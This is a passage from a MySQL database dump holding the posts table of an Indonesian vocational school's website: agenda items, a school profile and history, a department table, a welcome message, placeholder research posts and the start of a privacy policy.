  `nama_link` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `link_asli` varchar(150) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `id_user` int(11) NOT NULL,
  `status` int(10) NOT NULL,
  `komen` int(11) NOT NULL,
  `label` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `jam` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `lokasi` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `type` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `parent` int(11) NOT NULL,
  `order` int(11) NOT NULL,
  `fitur_img` varchar(300) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `alt_img` varchar(120) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `deskripsi` varchar(120) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `eng_post` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `eng_title` varchar(250) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_post`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 739 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_post
-- ----------------------------
INSERT INTO `tb_post` VALUES (235, '0', 'Pendaftaran Siswa Baru 2016', '<p><strong><img src=\"http://www.aknponorogo.com/upload/1-2.jpg\" alt=\"\" width=\"640\" height=\"392\" /></strong></p>\r\n<p><strong>UTS jadwal : 20 April</strong> 2016</p>\r\n<p>Pengumpulan Soal UAS Gasal adalah pengumpulan&nbsp;Pengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulan.&nbsp;</p>\r\n<p>Pengumpulan Soal UAS Gasal adalah pengumpulan&nbsp;Pengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulan.</p>\r\n<p>Pengumpulan Soal UAS Gasal adalah pengumpulan&nbsp;Pengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulanPengumpulan Soal UAS Gasal adalah pengumpulan.</p>', '2016-10-14', '2016-10-14 09:41:15', 416, 'http://www.smkn1jenpo.sch.id/agenda/', 'agenda-pertama', 'http://www.smkn1jenpo.sch.id/agenda/agenda-pertama', 2, 1, 0, '0', '09:41:15', '', 'agenda', 0, 0, '', '', '', '<p>UTS schedule: April 20, 2016 <br /><br />collection of Reserved UAS Gasal Collection is the collection of Reserved UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS is the collection of Gasal. <br /><br />The collection of Reserved UAS Gasal Collection is the collection of Reserved UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS is the collection of Gasal. <br /><br />The collection of Reserved UAS Gasal Collection is the collection of Reserved UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is pengumpulanPengumpulan matter of UAS Gasal is the collection.</p>', 'New student registration 2016');
INSERT INTO `tb_post` VALUES (244, '', 'Ujian Akhir Nasional Berbasis Komputer', '<p>Dalam rangka ujian nasioanl berbasis komputer. SMKN 1 Jenpo membeli alat komputer&nbsp;</p>', '2016-10-14', '2016-10-14 09:41:18', 875, 'http://www.smkn1jenpo.sch.id/agenda/', 'pengumpulan-soal-uas-gasal', 'http://www.smkn1jenpo.sch.id/agenda/pengumpulan-soal-uas-gasal', 2, 1, 0, '0', '09:41:18', '', 'agenda', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (245, '', 'profil smkn 1 jenangan ponorogo', '<p><iframe src=\"//www.youtube.com/embed/hNw3gGdcmuQ\" width=\"560\" height=\"314\" allowfullscreen=\"allowfullscreen\"></iframe></p>\r\n<p><strong>SMK Negeri 1 Jenangan Ponorogo</strong> adalah sebuah sekolah menengah kejuruan yang fokus pada bidang keteknikan. Sekolah ini merupakan sekolah teknik tertua di <a class=\"mw-redirect\" title=\"Ponorogo\" href=\"https://id.wikipedia.org/wiki/Ponorogo\">Ponorogo</a>. Terdapat 7 Program keahlian yang diselenggarakan oleh sekolah ini. Siswa dibagi menjadi 14 rombongan belajar dalam 3 tingkatan kelas. Sistem pembelajarannya sendiri menganut sistem Blok.</p>\r\n<p>SMK Negeri 1 Jenangan Ponorogo sebagai SMK Kelompok Teknologi Industri merupakan bagian dari Sistem Pendidikan Nasional dalam hal ini Direktorat Pembinaan Sekolah Menengah Direktorat Jenderal Manajemen Pendidikan Dasar dan Menengah, yang mengemban misi untuk mempersiapkan dan meningkatkan sumber daya manusia tingkat menengah.</p>\r\n<p>Dalam perjalanannya SMK Negeri 1 Jenangan Ponorogo dipercaya oleh Direktorat Pembinaan SMK Depdiknas baik secara langsung maupun melalui Dinas Pendidikan Kabupaten Ponorogo untuk menyelenggarakan berbagai kegiatan, diantaranya</p>', '2018-07-16', '2018-07-16 19:17:49', 332, 'http://www.smkn1jenpo.sch.id/', 'profil', 'http://www.smkn1jenpo.sch.id/profil', 4, 1, 0, '0', '19:17:49', '', 'pages', 0, 0, '', '', '', '<p><iframe src=\"//www.youtube.com/embed/hNw3gGdcmuQ\" width=\"560\" height=\"315\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"></iframe></p>\r\n<p>SMK Negeri 1 Jenangan Ponorogo is a vocational high school that focuses on environmental field. This school is the oldest engineering school in Ponorogo. There are 7 programs organized by the school. Students are divided into 14 groups of learning in 3 grade levels. The lesson that the system itself has <br /><br />the block. SMK Negeri 1 Jenangan Ponorogo as SMK Industrial Technology Group is part of the national education system in this Directorate, Directorate General of high school Coaching the management of primary and secondary education, which has the mission to prepare and enhance human resources intermediate level. <br /><br />SMK Negeri 1 in Ponorogo Jenangan trusted by the Directorate of construction of SMK Mone either directly or through the Office of education Ponorogo to organise various activities, among them; School Mapping and Monev, WAN city, Educational TV, MR-IT, ICT Center, distance education (DISTANCE EDUCATION) program or the Virtual Campus <br /><br /><br />HISTORY of SMK Negeri 1 Jenangan established in 1964, the results of the initiative of the local authorities and the business/industrial world in ponorogo fists at the time it was called STM (Secondary Technology School) preparation of Country Ponorogo. This institution became officially STM Negeri Ponorogo based on DECISION LETTER of the Minister of education and culture the number 148/Diprt/BI/66 on February 1, 1966. Change of STM Negeri Ponorogo being SMK Negeri 1 Jenangan based on DECISION LETTER of Minister of education number 036/12/1997 dated March 7, 1997 <br /><br />PROGRAM <br />SMK Negeri 1 Jenangan is a vocational school that focuses on Environmental field. The following list of programs are there in this school: <br /><br /></p>\r\n<ol>\r\n<li>Teknik Konstruksi Kayu</li>\r\n<li>Teknik Gambar Bangunan</li>\r\n<li>Teknik Pemesinan</li>\r\n<li>Teknik Pengelasan</li>\r\n<li>Teknik Sepeda Motor</li>\r\n<li>Teknik Elektronik Industri</li>\r\n<li>Teknik Otomasi Industri</li>\r\n<li>Rekayasa Perangkat Luna</li>\r\n</ol>', 'Profile SMK N 1 Jenangan, Ponorogo');
INSERT INTO `tb_post` VALUES (247, '', 'jurusan', '<div class=\"table\">\n<table class=\"table table-striped b-t b-light\" style=\"border: none;\">\n<thead>\n<tr bgcolor=\"#f9fafc\">\n<th style=\"width: 14.8519%;\"><strong>Jurusan</strong></th>\n<th style=\"width: 40.1481%;\"><strong>Deskripsi Jurusan</strong></th>\n<th style=\"width: 15%;\"><strong>Kepala Jurusan</strong></th>\n<th style=\"width: 27%;\"><strong>Jumlah Kelas</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr bgcolor=\"#f9fafc\">\n<td style=\"width: 14.8519%;\"><strong>Teknik Informatika</strong></td>\n<td style=\"width: 40.1481%;\">\n<p>Dijurusan ini nantinya mahasiswa akan di ajarkan tentang dunia Komputer, khususnya dunia permrogramman dan jaringan komouter. Adapun bahasa pemrogramman yang dipelajari yaitu PHP, JavaScript, C, C , dln.</p>\n<p>Selain bahasa pemrograman juga di ajarkan bagaimana mengolah data. yaitu dengan Database Oracle maupun MySql.</p>\n<p>Diharapkan lulusan jurusan ini mampu menguasai dunia komputer baik untuk industri maupun di perkantoran.</p>\n</td>\n<td style=\"width: 15%;\">\n<p style=\"text-align: left;\"><strong>Nanik Nuryantini, S.Pd</strong></p>\n</td>\n<td style=\"width: 27%;\">\n<p style=\"text-align: left;\"><strong>2 Kelas</strong></p>\n<p style=\"text-align: left;\">1 kelas sebanyak 30 mahasiswa</p>\n</td>\n</tr>\n<tr>\n<td style=\"width: 14.8519%;\"><strong>Mekatronika </strong></td>\n<td style=\"width: 40.1481%;\">\n<p>Pada jurusan ini nantinya mahasiswa akan di ajarkan PLC, CNC, bahasa kelistrikan juga mikrontroller.</p>\n</td>\n<td style=\"width: 15%;\">\n<p><strong>Rusdini Harahap, S.Pd, MMPd</strong></p>\n</td>\n<td style=\"width: 27%;\">\n<p><strong>1 Kelas</strong></p>\n<p>1 kelas sebanyak 30 mahasiswa</p>\n</td>\n</tr>\n</tbody>\n</table>\n</div>', '2018-07-14', '2018-07-14 10:43:01', 54, 'http://www.smkn1jenpo.sch.id/', '', 'http://www.smkn1jenpo.sch.id/', 4, 2, 0, '0', '10:43:01', '', 'pages', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (248, '', 'Sekapur Sirih', '<p>Assalamu\'alaikum wr. wb</p>\r\n<p><strong>Akademi Komunitas Negeri Ponorogo</strong> merupakan program Diploma 2 (D2) di luar domisili Poliketenik Elektronika Negeri Suarabaya dan merupakan lembaga pendidikan negeri kejuruan pasca MA, SMA, dan SMK. Untuk kurikulumnya dibangun dengan Politeknik, DU/Di, dan pelaku pasar yang berorientasi pengembangan profesi industri yang berkelanjutan. Secara kelembagaan Akademi Komunitas Negeri Ponorogo berada di bawah binaan langsung direktorat jendral pendidikan tinggi dengan status negeri.<br />Sebagai lembaga pendidikan profesi, Akademi Komunitas Negeri Ponorogo dijamin kualitasnya oleh politeknik-politeknik negeri antara lain PENS Surabaya dan POLMAN Bandung, juga untuk keahlianya akan tersertifikasi dengan standard nasional maupun internasional, CISCO, JAVA/JENI, ORACLE, KKPI, FESTO dll.<br />System Pendidikan yang berkelanjutan memungkinkan mahasiswa untuk mudah dalam belajar dan untuk melanjutkan ke jenjang yang lebih tinggi (D3, D4, dst). Sehingga akan terefisiensi waktu, biaya dengan aspek kemudahan bagi seseorang untuk mengembangkan profesinya.<br />Sebagai semangat belajar, Akademi Komunitas Negeri Ponorogo mempunyai <strong>Jargon</strong>.</p>\r\n<h3><strong>\"Akademi Komunitas Negeri Ponorogo .. BAKAR ! \" (Bangun dan Berkarya).</strong></h3>\r\n<p>Selamat bergabung.</p>\r\n<p>Koordinator</p>\r\n<p><strong>Drs. Bambang Suwarno, SST</strong></p>\r\n<p>Wasslamualaikum wr. wb</p>', '2016-10-14', '2016-10-14 09:40:45', 2080, 'http://www.smkn1jenpo.sch.id/profil-smkn-1-jenangan-ponorogo/', 'sekapur-sirih', 'http://www.smkn1jenpo.sch.id/profil-smkn-1-jenangan-ponorogo/sekapur-sirih', 2, 1, 0, '0', '09:40:45', '', 'pages', 245, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (253, '', 'Sistem Penjualan Berbasis Android', '<p>Sistem Penjualan Berbasis Android</p>\r\n<p><img src=\"http://www.aknponorogo.com/upload/2-02_preview.jpg\" alt=\"\" /></p>', '2016-10-14', '2016-10-14 09:41:35', 0, 'http://www.smkn1jenpo.sch.id/research/', 'sistem-penjualan-berbasis-android', 'http://www.smkn1jenpo.sch.id/research/sistem-penjualan-berbasis-android', 2, 1, 0, '0', '09:41:35', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (254, '', 'Sistem Informasi', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-10-14', '2016-10-14 09:41:38', 0, 'http://www.smkn1jenpo.sch.id/research/', 'sistem-informasi', 'http://www.smkn1jenpo.sch.id/research/sistem-informasi', 2, 1, 0, '0', '09:41:38', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (255, '', 'Sistem Informasi 2', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-2', 'http://www.aknponorogo.com/research/sistem-informasi-2', 2, 1, 0, '0', '09:20:30', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (256, '', 'Sistem Informasi 3 berbasis mikrokontroller', '<p><img src=\"http://www.aknponorogo.com/upload/2-02_preview.jpg\" alt=\"\" width=\"475\" height=\"281\" />Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 1, 'http://www.aknponorogo.com/research/', 'sistem-informasi-3', 'http://www.aknponorogo.com/research/sistem-informasi-3', 2, 1, 0, '0', '09:44:43', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (257, '', 'Sistem Informasi 4 Manajemen Akuntansi berbasis android', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-4', 'http://www.aknponorogo.com/research/sistem-informasi-4', 2, 1, 0, '0', '09:46:41', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (258, '', 'Sistem Informasi 5', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-5', 'http://www.aknponorogo.com/research/sistem-informasi-5', 2, 1, 0, '0', '09:21:28', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (259, '', 'Sistem Informasi 6', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-6', 'http://www.aknponorogo.com/research/sistem-informasi-6', 2, 1, 0, '0', '09:21:50', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (260, '', 'Sistem Informasi 7', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', '', 'http://www.aknponorogo.com/research/', 2, 1, 0, '0', '09:22:03', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (261, '', 'Sistem Informasi 8', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 1, 'http://www.aknponorogo.com/research/', 'sistem-informasi-8', 'http://www.aknponorogo.com/research/sistem-informasi-8', 2, 1, 0, '0', '09:22:24', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (262, '', 'Sistem Informasi 9', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-9', 'http://www.aknponorogo.com/research/sistem-informasi-9', 2, 1, 0, '0', '09:22:41', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (263, '', 'Sistem Informasi 10', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-10', 'http://www.aknponorogo.com/research/sistem-informasi-10', 2, 1, 0, '0', '09:23:04', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (264, '', 'Sistem Informasi 101', '<p>Sistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem InformasiSistem Informasi</p>', '2016-04-15', '0000-00-00 00:00:00', 0, 'http://www.aknponorogo.com/research/', 'sistem-informasi-101', 'http://www.aknponorogo.com/research/sistem-informasi-101', 2, 1, 0, '0', '09:23:22', '', 'research', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (268, '', 'Try Out Persiapan UN 2017', '<p>Try Out Persiapan UN 2017 akan dilaksakan pada tanggal 27 Juni 2016. Untuk jadwal UAS bisa di unduh disini.</p>', '2016-10-14', '2016-10-14 09:41:21', 893, 'http://www.smkn1jenpo.sch.id/agenda/', 'try-out-persiapan-un-2017', 'http://www.smkn1jenpo.sch.id/agenda/try-out-persiapan-un-2017', 2, 1, 0, '0', '09:41:21', '', 'agenda', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (269, '', 'Masa Orientasi Siswa 2017 Dalam Rangka HUT RI ', '<p>Masa Orientasi adalaah Mos yang berarti siswa harus dicukur ploco atau gundul. Siswa ini wajib memakai sarung dan songkok sebagai warga negeara yang taat beragama/.</p>', '2016-10-14', '2016-10-14 09:41:24', 1681, 'http://www.smkn1jenpo.sch.id/agenda/', 'masa-orientasi-siswa-2017-dalam-rangka-hut-ri', 'http://www.smkn1jenpo.sch.id/agenda/masa-orientasi-siswa-2017-dalam-rangka-hut-ri', 2, 1, 0, '0', '09:41:24', '', 'agenda', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (271, '', 'Privacy Policy', '<p>If you require any more information or have any questions about our privacy policy, please feel free to contact us by email at <a href=\"mailto:smkn1jenpo@yahoo.co.id\">http://www.smkn1jenpo.sch.id/contact</a>.</p>\r\n<p>At http://www.smkn1jenpo.sch.id we consider the privacy of our visitors to be extremely important. This privacy policy document describes in detail the types of personal information is collected and recorded by http://www.smkn1jenpo.sch.id and how we use it.</p>\r\n<p><strong>Log Files</strong><br /> Like many other Web sites, http://www.smkn1jenpo.sch.id makes use of log files. These files merely logs visitors to the site - usually a standard procedure for hosting companies and a part of hosting services\'s analytics. The information inside the log files includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date/time stamp, referring/exit pages, and possibly the number of clicks. This information is used to analyze trends, administer the site, track user\'s movement around the site, and gather demographic information. IP addresses, and other such information are not linked to any information that is personally identifiable.</p>\r\n<p><strong>Cookies and Web Beacons</strong><br />http://www.smkn1jenpo.sch.id uses cookies to store information about visitors\' preferences, to record user-specific information on which pages the site visitor accesses or visits, and to personalize or customize our web page content based upon visitors\' browser type or other information that the visitor sends via their browser.</p>\r\n<p><strong>DoubleClick DART Cookie</strong><br /> &rarr; Google, as a third party vendor, uses cookies to serve ads on http://www.smkn1jenpo.sch.id.<br /> 